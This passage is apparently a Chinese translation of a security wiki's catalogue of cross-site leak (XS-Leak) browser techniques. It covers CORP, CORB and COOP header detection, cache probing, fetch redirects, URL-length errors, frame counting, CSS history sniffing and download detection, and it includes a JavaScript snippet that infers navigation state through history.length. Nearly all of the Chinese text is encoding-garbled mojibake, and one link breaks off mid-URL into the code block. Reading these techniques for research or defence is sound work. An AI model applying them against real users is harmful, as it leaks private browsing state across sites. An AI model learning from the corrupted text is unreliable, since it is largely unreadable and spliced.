è¿™å…è®¸æ”»å‡»è€…æ£€æµ‹è·¨åŸŸé¡µé¢çš„ç‰¹å®š CSP æŒ‡ä»¤ï¼Œå¦‚æœå¯ä»¥**æ£€æµ‹åˆ°é”™è¯¯é¡µé¢**ã€‚å°½ç®¡è¿™ä¸ªæ¼æ´ç°åœ¨è¢«æ ‡è®°ä¸ºå·²ä¿®å¤ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ç§**æ–°çš„æ³„éœ²æŠ€æœ¯å¯ä»¥æ£€æµ‹é”™è¯¯é¡µé¢ï¼Œå› ä¸ºåº•å±‚é—®é¢˜ä»æœªå¾—åˆ°è§£å†³ã€‚**

### **CORP**

* **åŒ…å«æ–¹æ³•**ï¼šFetch API
* **å¯æ£€æµ‹å·®å¼‚**ï¼šå¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**ï¼š[**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **æ¦‚è¦**ï¼šç”¨ CORP ä¿æŠ¤çš„èµ„æºåœ¨è·å–æ—¶ä¼šæŠ›å‡ºé”™è¯¯ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP å¤´éƒ¨æ˜¯ä¸€ä¸ªç›¸å¯¹è¾ƒæ–°çš„ç½‘ç»œå¹³å°å®‰å…¨åŠŸèƒ½ï¼Œè®¾ç½®å**é˜»æ­¢å¯¹ç»™å®šèµ„æºçš„ no-cors è·¨åŸŸè¯·æ±‚**ã€‚å¯ä»¥æ£€æµ‹åˆ°å¤´éƒ¨çš„å­˜åœ¨ï¼Œå› ä¸ºç”¨ CORP ä¿æŠ¤çš„èµ„æºåœ¨è·å–æ—¶ä¼š**æŠ›å‡ºé”™è¯¯**ã€‚

### CORB

* **åŒ…å«æ–¹æ³•**ï¼šHTML å…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šå¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **æ¦‚è¦**ï¼šCORB å…è®¸æ”»å‡»è€…æ£€æµ‹è¯·æ±‚ä¸­æ˜¯å¦å­˜åœ¨**`nosniff` å¤´éƒ¨**ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

æœ‰å…³æ”»å‡»çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹æ›´å¤šä¿¡æ¯é“¾æ¥ã€‚

### CORS é”™è¯¯åœ¨ Origin åå°„é…ç½®é”™è¯¯ä¸Š <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **åŒ…å«æ–¹æ³•**ï¼šFetch API
* **å¯æ£€æµ‹å·®å¼‚**ï¼šå¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **æ¦‚è¦**ï¼šå¦‚æœ Origin å¤´éƒ¨åœ¨å¤´éƒ¨ `Access-Control-Allow-Origin` ä¸­è¢«åå°„ï¼Œåˆ™å¯ä»¥æ£€æŸ¥èµ„æºæ˜¯å¦å·²ç»åœ¨ç¼“å­˜ä¸­ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

å¦‚æœ**Origin å¤´éƒ¨**åœ¨å¤´éƒ¨ `Access-Control-Allow-Origin` ä¸­è¢«**åå°„**ï¼Œæ”»å‡»è€…å¯ä»¥æ»¥ç”¨æ­¤è¡Œä¸ºå°è¯•ä»¥**CORS**æ¨¡å¼**è·å–**èµ„æºã€‚å¦‚æœæ²¡æœ‰è§¦å‘**é”™è¯¯**ï¼Œåˆ™æ„å‘³ç€å®ƒæ˜¯**æ­£ç¡®ä»ç½‘ç»œæ£€ç´¢çš„**ï¼Œå¦‚æœè§¦å‘äº†é”™è¯¯ï¼Œé‚£æ˜¯å› ä¸ºå®ƒæ˜¯**ä»ç¼“å­˜è®¿é—®çš„**ï¼ˆé”™è¯¯å‡ºç°æ˜¯å› ä¸ºç¼“å­˜ä¿å­˜äº†ä¸€ä¸ªå…è®¸åŸå§‹åŸŸè€Œéæ”»å‡»è€…åŸŸçš„ CORS å¤´éƒ¨çš„å“åº”ï¼‰**ã€‚**\
è¯·æ³¨æ„ï¼Œå¦‚æœåŸå§‹æºæ²¡æœ‰è¢«åå°„ï¼Œè€Œæ˜¯ä½¿ç”¨äº†é€šé…ç¬¦ï¼ˆ`Access-Control-Allow-Origin: *`ï¼‰ï¼Œè¿™å°†ä¸èµ·ä½œç”¨ã€‚

## å¯è¯»å±æ€§æŠ€æœ¯

### Fetch é‡å®šå‘

* **åŒ…å«æ–¹æ³•**ï¼šFetch API
* **å¯æ£€æµ‹å·®å¼‚**ï¼šçŠ¶æ€ç 
* **æ›´å¤šä¿¡æ¯**ï¼š[https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **æ¦‚è¦**ï¼šGC å’Œ SA å…è®¸åœ¨é‡å®šå‘å®Œæˆåæ£€æŸ¥å“åº”çš„ç±»å‹ï¼ˆopaque-redirectï¼‰ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

ä½¿ç”¨ Fetch API å¹¶è®¾ç½® `redirect: "manual"` å’Œå…¶ä»–å‚æ•°æäº¤è¯·æ±‚ï¼Œå¯ä»¥è¯»å– `response.type` å±æ€§ï¼Œå¦‚æœå®ƒç­‰äº `opaqueredirect`ï¼Œåˆ™å“åº”æ˜¯ä¸€ä¸ªé‡å®šå‘ã€‚

### COOP

* **åŒ…å«æ–¹æ³•**ï¼šå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šå¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **æ¦‚è¦**ï¼šCOOP ä¿æŠ¤çš„é¡µé¢æ— æ³•è®¿é—®ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

æ”»å‡»è€…å¯ä»¥æ³„éœ²è·¨åŸŸ HTTP å“åº”ä¸­æ˜¯å¦å¯ç”¨è·¨æºæ‰“å¼€è€…ç­–ç•¥ï¼ˆCOOPï¼‰å¤´éƒ¨ã€‚

Web åº”ç”¨ç¨‹åºå¯ä»¥éƒ¨ç½² COOP å“åº”å¤´éƒ¨ä»¥é˜²æ­¢å…¶ä»–ç½‘ç«™è·å¾—å¯¹åº”ç”¨ç¨‹åºçš„ä»»æ„çª—å£å¼•ç”¨ã€‚ç„¶è€Œï¼Œè¿™ä¸ª**å¤´éƒ¨å¯ä»¥å¾ˆå®¹æ˜“åœ°è¢«æ£€æµ‹åˆ°**ï¼Œé€šè¿‡å°è¯•è¯»å–**`contentWindow` å¼•ç”¨**ã€‚å¦‚æœä¸€ä¸ªç«™ç‚¹åªåœ¨ä¸€ç§çŠ¶æ€ä¸‹éƒ¨ç½²**COOP**ï¼Œè¿™ä¸ªå±æ€§ï¼ˆopenerï¼‰æ˜¯**æœªå®šä¹‰çš„**ï¼Œ**å¦åˆ™**å®ƒæ˜¯**å®šä¹‰çš„**ã€‚

### URL æœ€å¤§é•¿åº¦ - æœåŠ¡å™¨ç«¯

* **åŒ…å«æ–¹æ³•**ï¼šFetch API, HTML å…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šçŠ¶æ€ç  / å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **æ¦‚è¦**ï¼šç”±äºé‡å®šå‘å“åº”é•¿åº¦å¯èƒ½å¤ªå¤§ï¼ŒæœåŠ¡å™¨å›å¤é”™è¯¯å¹¶ç”Ÿæˆè­¦æŠ¥ï¼Œå› æ­¤æ£€æµ‹å“åº”ä¸­çš„å·®å¼‚ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

å¦‚æœæœåŠ¡å™¨ç«¯é‡å®šå‘åœ¨é‡å®šå‘ä¸­ä½¿ç”¨**ç”¨æˆ·è¾“å…¥**å’Œ**é¢å¤–æ•°æ®**ã€‚å¯ä»¥æ£€æµ‹åˆ°è¿™ç§è¡Œä¸ºï¼Œå› ä¸ºé€šå¸¸**æœåŠ¡å™¨**æœ‰ä¸€ä¸ª**é™åˆ¶è¯·æ±‚é•¿åº¦**ã€‚å¦‚æœ**ç”¨æˆ·æ•°æ®**æ˜¯**é•¿åº¦ - 1**ï¼Œå› ä¸º**é‡å®šå‘**æ­£åœ¨ä½¿ç”¨**è¯¥æ•°æ®**å¹¶**æ·»åŠ **ä¸€äº›**é¢å¤–çš„**ï¼Œå®ƒå°†è§¦å‘ä¸€ä¸ª**é€šè¿‡é”™è¯¯äº‹ä»¶å¯æ£€æµ‹çš„é”™è¯¯**ã€‚

å¦‚æœä½ èƒ½ä»¥æŸç§æ–¹å¼ä¸ºç”¨æˆ·è®¾ç½® cookieï¼Œä½ ä¹Ÿå¯ä»¥é€šè¿‡**è®¾ç½®è¶³å¤Ÿçš„ cookie**ï¼ˆ[**cookie ç‚¸å¼¹**](hacking-with-cookies/cookie-bomb.md)ï¼‰æ‰§è¡Œæ­¤æ”»å‡»ï¼Œå› æ­¤**æ­£ç¡®å“åº”çš„å“åº”å¢åŠ å¤§å°**ä¼šè§¦å‘ä¸€ä¸ª**é”™è¯¯**ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯·è®°ä½ï¼Œå¦‚æœä½ ä»åŒä¸€ç«™ç‚¹è§¦å‘æ­¤è¯·æ±‚ï¼Œ`<script>` å°†è‡ªåŠ¨å‘é€ cookieï¼ˆå› æ­¤ä½ å¯ä»¥æ£€æŸ¥é”™è¯¯ï¼‰ã€‚\
**cookie ç‚¸å¼¹ + XS-Search** çš„ä¸€ä¸ªç¤ºä¾‹å¯ä»¥åœ¨æ­¤ writeup çš„é¢„æœŸè§£å†³æ–¹æ¡ˆä¸­æ‰¾åˆ°ï¼š[https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

é€šå¸¸éœ€è¦ `SameSite=None` æˆ–å¤„äºç›¸åŒä¸Šä¸‹æ–‡ä¸­æ‰èƒ½è¿›è¡Œæ­¤ç±»æ”»å‡»ã€‚

### URL æœ€å¤§é•¿åº¦ - å®¢æˆ·ç«¯

* **åŒ…å«æ–¹æ³•**ï¼šå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šçŠ¶æ€ç  / å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **æ¦‚è¦**ï¼šç”±äºé‡å®šå‘å“åº”é•¿åº¦å¯èƒ½å¯¹äºè¯·æ±‚æ¥è¯´å¤ªå¤§ï¼Œå› æ­¤å¯ä»¥æ³¨æ„åˆ°å·®å¼‚ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### å¸§è®¡æ•°

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶ï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **æ¦‚è¦**ï¼šè¯»å–å¸§æ•°ï¼ˆwindow.lengthï¼‰ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

é€šè¿‡ `iframe` æˆ– `window.open` æ‰“å¼€çš„ç½‘é¡µä¸­è®¡ç®—**å¸§æ•°**ï¼Œå¯ä»¥å¸®åŠ©è¯†åˆ«ç”¨æˆ·åœ¨è¯¥é¡µé¢ä¸Šçš„**çŠ¶æ€**ã€‚\
æ­¤å¤–ï¼Œå¦‚æœé¡µé¢çš„å¸§æ•°å§‹ç»ˆç›¸åŒï¼Œ**æŒç»­**æ£€æŸ¥å¸§æ•°å¯ä»¥å¸®åŠ©è¯†åˆ«å¯èƒ½**æ³„éœ²ä¿¡æ¯**çš„**æ¨¡å¼**ã€‚

è¿™é¡¹æŠ€æœ¯çš„ä¸€ä¸ªä¾‹å­æ˜¯ï¼Œåœ¨chromeä¸­ï¼Œå¯ä»¥é€šè¿‡**å¸§è®¡æ•°**æ¥**æ£€æµ‹** **PDF**ï¼Œå› ä¸ºå†…éƒ¨ä½¿ç”¨äº† `embed`ã€‚æœ‰ä¸€äº›[æ‰“å¼€URLå‚æ•°](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113)ï¼Œå…è®¸å¯¹å†…å®¹è¿›è¡Œä¸€äº›æ§åˆ¶ï¼Œä¾‹å¦‚ `zoom`ã€`view`ã€`page`ã€`toolbar`ï¼Œåœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œè¿™é¡¹æŠ€æœ¯å¯èƒ½å¾ˆæœ‰è¶£ã€‚

### HTMLElements

* **åŒ…å«æ–¹æ³•**ï¼šHTMLå…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **æ¦‚è¦**ï¼šè¯»å–æ³„éœ²çš„å€¼ä»¥åŒºåˆ†ä¸¤ç§å¯èƒ½çš„çŠ¶æ€
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)ï¼Œ[https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak)ï¼Œ[https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

ä¸€äº›ç½‘é¡µå¯èƒ½ä¼šæ ¹æ®ç”¨æˆ·ä¿¡æ¯**åŠ¨æ€ç”Ÿæˆåª’ä½“æ–‡ä»¶**ï¼Œæˆ–æ·»åŠ æ”¹å˜åª’ä½“å¤§å°çš„æ°´å°ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨è¿™äº›HTMLå…ƒç´ æ³„éœ²çš„ä¿¡æ¯æ¥åŒºåˆ†å¯èƒ½çš„çŠ¶æ€ã€‚

ä¸€äº›HTMLElementsä¼šå‘è·¨æºæ³„éœ²ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚å®ƒä»¬æ˜¯ä»€ä¹ˆç±»å‹çš„åª’ä½“ï¼š

* [HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) æ³„éœ²åª’ä½“ `duration` å’Œ `buffered` æ—¶é—´ã€‚
* [HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement) æ³„éœ² `videoHeight` å’Œ `videoWidth`ï¼Œä¸€äº›æµè§ˆå™¨å¯èƒ½è¿˜æœ‰ `webkitVideoDecodedByteCount`ã€`webkitAudioDecodedByteCount` å’Œ `webkitDecodedFrameCount`
* [getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality) æ³„éœ² `totalVideoFrames`ã€‚
* [HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement) æ³„éœ² `height` å’Œ `width`ï¼Œä½†å¦‚æœå›¾åƒæ— æ•ˆï¼Œå®ƒä»¬å°†ä¸º0ï¼Œ[`image.decode()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode) å°†è¢«æ‹’ç»ã€‚

### CSSå±æ€§

* **åŒ…å«æ–¹æ³•**ï¼šHTMLå…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle)ï¼Œ[https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **æ¦‚è¦**ï¼šæ ¹æ®ç”¨æˆ·çŠ¶æ€æ£€æµ‹ç½‘ç«™æ ·å¼ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Webåº”ç”¨ç¨‹åºå¯èƒ½ä¼šæ ¹æ®ç”¨æˆ·çš„**çŠ¶æ€æ”¹å˜ç½‘ç«™æ ·å¼**ã€‚è·¨æºCSSæ–‡ä»¶å¯ä»¥é€šè¿‡**HTMLé“¾æ¥å…ƒç´ **åµŒå…¥åˆ°æ”»å‡»è€…é¡µé¢ä¸­ï¼Œ**è§„åˆ™**å°†è¢«**åº”ç”¨**åˆ°æ”»å‡»è€…é¡µé¢ã€‚å¦‚æœé¡µé¢åŠ¨æ€æ›´æ”¹è¿™äº›è§„åˆ™ï¼Œæ”»å‡»è€…å¯ä»¥**æ£€æµ‹**è¿™äº›**å·®å¼‚**ï¼Œå–å†³äºç”¨æˆ·çŠ¶æ€ã€‚\
ä½œä¸ºæ³„éœ²æŠ€æœ¯ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨ `window.getComputedStyle` æ–¹æ³•æ¥**è¯»å–CSS**å±æ€§ã€‚å› æ­¤ï¼Œå¦‚æœå·²çŸ¥å—å½±å“çš„å…ƒç´ å’Œå±æ€§åç§°ï¼Œæ”»å‡»è€…å¯ä»¥è¯»å–ä»»æ„CSSå±æ€§ã€‚

### CSSå†å²

* **åŒ…å«æ–¹æ³•**ï¼šHTMLå…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **æ¦‚è¦**ï¼šæ£€æµ‹æ˜¯å¦åº”ç”¨äº† `:visited` æ ·å¼åˆ°ä¸€ä¸ªURLï¼Œè¡¨æ˜å®ƒå·²ç»è¢«è®¿é—®è¿‡
* **ä»£ç ç¤ºä¾‹**ï¼š[http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
æ ¹æ®[**è¿™ä¸ª**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/)ï¼Œåœ¨æ— å¤´Chromeä¸­ä¸èµ·ä½œç”¨ã€‚
{% endhint %}

ä½¿ç”¨CSS [`:visited`](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited) é€‰æ‹©å™¨ï¼Œå¯ä»¥ä¸ºå·²è®¿é—®çš„URLåº”ç”¨ä¸åŒçš„æ ·å¼ã€‚\
ä»¥å‰å¯ä»¥ä½¿ç”¨ [`getComputedStyle()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle) æ¥æ£€æµ‹è¿™ç§å·®å¼‚ï¼Œä½†ç°åœ¨æµè§ˆå™¨é€šè¿‡å§‹ç»ˆè¿”å›é“¾æ¥è¢«è®¿é—®çš„å€¼å¹¶é™åˆ¶ä½¿ç”¨é€‰æ‹©å™¨å¯ä»¥åº”ç”¨çš„æ ·å¼æ¥é˜²æ­¢è¿™ç§æƒ…å†µã€‚\
å› æ­¤ï¼Œå¯èƒ½éœ€è¦è¯±ä½¿ç”¨æˆ·ç‚¹å‡»CSSå½±å“çš„åŒºåŸŸï¼Œè¿™å¯ä»¥ä½¿ç”¨ [`mix-blend-mode`](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode) æ¥å®Œæˆã€‚\
è¿˜æœ‰ä¸€äº›ä¸éœ€è¦ç”¨æˆ·äº’åŠ¨çš„æ–¹æ³•ï¼Œä¾‹å¦‚æ»¥ç”¨æ¸²æŸ“æ—¶é—´ï¼Œå› ä¸ºå°†é“¾æ¥æ¶‚æˆä¸åŒé¢œè‰²éœ€è¦æ—¶é—´ã€‚\
åœ¨chromiumæŠ¥å‘Šä¸­æä¾›äº†ä¸€ä¸ªPoCï¼Œé€šè¿‡ä½¿ç”¨å¤šä¸ªé“¾æ¥æ¥å¢åŠ æ—¶é—´å·®å¼‚æ¥å·¥ä½œã€‚

### ContentDocument X-Frame æ³„éœ²

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶
* **å¯æ£€æµ‹å·®å¼‚**ï¼šå¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **æ¦‚è¦**ï¼šåœ¨GCä¸­ï¼Œå½“é¡µé¢å› ä¸º**X-Frame-Optionsè®¾ç½®ä¸ºæ‹’ç»æˆ–åŒæºè€Œä¸å…è®¸åµŒå…¥åˆ°è·¨æºé¡µé¢æ—¶ï¼Œä¼šæ˜¾ç¤ºé”™è¯¯é¡µé¢**ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

åœ¨Chromeä¸­ï¼Œå½“é¡µé¢å› ä¸ºè®¾ç½®äº†**X-FrameOptions**ï¼ˆXFOï¼‰å¤´éƒ¨ä¸ºæ‹’ç»æˆ–åŒæºè€Œä¸å…è®¸åµŒå…¥åˆ°è·¨æºé¡µé¢æ—¶ï¼Œä¼šæ˜¾ç¤º**é”™è¯¯é¡µé¢**ã€‚å¯¹äºå¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡æ£€æŸ¥ `contentDocument` å±æ€§æ¥**æ£€æµ‹**è¿™ä¸ªé”™è¯¯é¡µé¢ã€‚é€šå¸¸ï¼Œè¿™ä¸ªå±æ€§è¿”å›nullï¼Œå› ä¸ºä¸å…è®¸è®¿é—®è·¨æºåµŒå…¥æ–‡æ¡£ã€‚ç„¶è€Œï¼Œç”±äº**Chromeæ¸²æŸ“**é”™è¯¯é¡µé¢ï¼Œè¿”å›äº†ä¸€ä¸ª**ç©ºæ–‡æ¡£å¯¹è±¡**ã€‚è¿™ä¸é€‚ç”¨äºiframeæˆ–å…¶ä»–æµè§ˆå™¨ã€‚å¼€å‘è€…å¯èƒ½å¿˜è®°ä¸ºæ‰€æœ‰é¡µé¢è®¾ç½®X-Frame-Optionsï¼Œç‰¹åˆ«æ˜¯é”™è¯¯é¡µé¢ç»å¸¸ç¼ºå°‘è¿™ä¸ªå¤´éƒ¨ã€‚ä½œä¸ºæ³„éœ²æŠ€æœ¯ï¼Œæ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿé€šè¿‡æ£€æŸ¥å®ƒæ¥åŒºåˆ†ä¸åŒçš„ç”¨æˆ·çŠ¶æ€ã€‚

### ä¸‹è½½æ£€æµ‹

* **åŒ…å«æ–¹æ³•**ï¼šæ¡†æ¶ï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šå¤´éƒ¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **æ¦‚è¦**ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡ä½¿ç”¨iframeæ£€æµ‹ä¸‹è½½ã€‚å¦‚æœiframeä»ç„¶å¯è®¿é—®ï¼Œåˆ™æ–‡ä»¶å·²ä¸‹è½½ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` å¤´éƒ¨ï¼ˆ[`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition)ï¼‰æŒ‡ç¤ºæµè§ˆå™¨æ˜¯åº”è¯¥ä¸‹è½½å†…å®¹è¿˜æ˜¯å†…è”æ˜¾ç¤ºå®ƒã€‚

å¦‚æœåªæœ‰ç™»å½•ç”¨æˆ·èƒ½å¤Ÿ**è®¿é—®å°†ä¸‹è½½æ–‡ä»¶çš„é¡µé¢**ï¼Œå› ä¸ºå®ƒä½¿ç”¨äº†å¤´éƒ¨ã€‚å¯ä»¥æ£€æµ‹åˆ°è¿™ç§è¡Œä¸ºã€‚

#### ä¸‹è½½æ  <a href="#download-bar" id="download-bar"></a>

åœ¨åŸºäºChromiumçš„æµè§ˆå™¨ä¸­ï¼Œå½“æ–‡ä»¶è¢«ä¸‹è½½æ—¶ï¼Œä¸‹è½½è¿‡ç¨‹çš„é¢„è§ˆ**å‡ºç°åœ¨åº•éƒ¨çš„æ ä¸­**ï¼Œé›†æˆåˆ°æµè§ˆå™¨çª—å£ä¸­ã€‚é€šè¿‡**ç›‘æ§çª—å£é«˜åº¦**ï¼Œæ”»å‡»è€…å¯ä»¥æ£€æµ‹â€œä¸‹è½½æ â€æ˜¯å¦æ‰“å¼€ã€‚

#### ä¸‹è½½å¯¼èˆªï¼ˆä½¿ç”¨iframesï¼‰ <a href="#download-navigation-with-iframes" id="download-navigation-with-iframes"></a>

å¦ä¸€ç§æµ‹è¯• [`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition) å¤´éƒ¨çš„æ–¹æ³•æ˜¯**æ£€æŸ¥æ˜¯å¦å‘ç”Ÿäº†å¯¼èˆª**ã€‚å¦‚æœé¡µé¢åŠ è½½å¯¼è‡´ä¸‹è½½ï¼Œå®ƒä¸ä¼šè§¦å‘å¯¼èˆªï¼Œ**çª—å£å°†ä¿æŒåœ¨åŒä¸€æºä¸­**ã€‚

#### ä¸‹è½½å¯¼èˆªï¼ˆä¸ä½¿ç”¨iframesï¼‰ <a href="#download-navigation-without-iframes" id="download-navigation-without-iframes"></a>

ä¸å‰ä¸€ç§æŠ€æœ¯ç›¸åŒï¼Œä½†ä½¿ç”¨ `window.open` è€Œä¸æ˜¯iframesã€‚

### åˆ†åŒºHTTPç¼“å­˜ç»•è¿‡ <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **åŒ…å«æ–¹æ³•**ï¼šå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ—¶é—´
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **æ¦‚è¦**ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡ä½¿ç”¨iframeæ£€æµ‹ä¸‹è½½ã€‚å¦‚æœiframeä»ç„¶å¯è®¿é—®ï¼Œåˆ™æ–‡ä»¶å·²ä¸‹è½½ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)ï¼Œ[https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722)ï¼ˆæ¥è‡ª[https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/)ï¼‰

{% hint style="warning" %}
